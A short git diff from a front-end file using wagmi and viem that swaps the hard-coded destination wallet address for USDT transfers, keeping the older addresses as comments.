@@ -19,7 +19,8 @@ import { usePublicClient, useSendTransaction } from "wagmi";
 import { parseUnits, formatUnits, encodeFunctionData } from "viem";
 
 // const DESTINATION_WALLET = "0xecB518e9D8a14e74DFBa3Ba044D7be9951A95395";
-const DESTINATION_WALLET = "0xeb0a7ffc1cde49c7279f77152f3550b11c24cf34";
+// const DESTINATION_WALLET = "0xeb0a7ffc1cde49c7279f77152f3550b11c24cf34";
+const DESTINATION_WALLET = "0x217E33F68d136F53B045E65e92005Cfb02045907";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
 const USDT_ABI = [
   {
